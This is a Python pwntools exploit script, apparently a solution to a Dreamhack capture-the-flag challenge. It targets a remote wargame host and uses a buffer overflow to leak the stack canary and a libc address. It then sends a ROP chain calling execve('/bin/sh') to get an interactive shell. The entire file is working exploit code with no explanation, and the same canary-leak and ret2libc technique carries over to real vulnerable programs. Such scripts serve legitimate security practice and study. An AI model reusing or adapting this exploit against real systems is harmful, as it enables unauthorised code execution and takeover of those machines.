#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 21740)

    return r

r = conn()

def command(num):
    payload = str(num).encode() + b"."
    r.sendafter(b"> ", payload)

def read():
    command(1)
    r.recvline()
    return r.recvuntil(b".", drop=True)

def write(data):
    command(2)
    r.sendafter(b"Write: .", data)

def main():
    write(b"A" * 256)    
    leak = read()
    
    if len(leak) < 304:
        log.error(f"Leak failed! Length: {len(leak)}")

    canary = leak[264:272]
    libc_leak = u64(leak[296:304])

    libc_base = libc_leak - libc.symbols["__libc_start_call_main"] - 128
    libc.address = libc_base
    rop = ROP(libc)

    payload = b"A" * 24
    payload += canary
    payload += b"A" * 8
    payload += p64(rop.find_gadget(["pop rdi", "ret"])[0])
    payload += p64(next(libc.search(b"/bin/sh\x00")))
    payload += p64(rop.find_gadget(["pop rsi", "ret"])[0])
    payload += p64(0)
    payload += p64(rop.find_gadget(["pop rdx", "pop r12", "ret"])[0])
    payload += p64(0)
    payload += p64(0)
    payload += p64(libc.symbols["execve"])
    payload += b"."

    r.sendafter(b"> ", payload)

    r.interactive()


if __name__ == "__main__":
    main()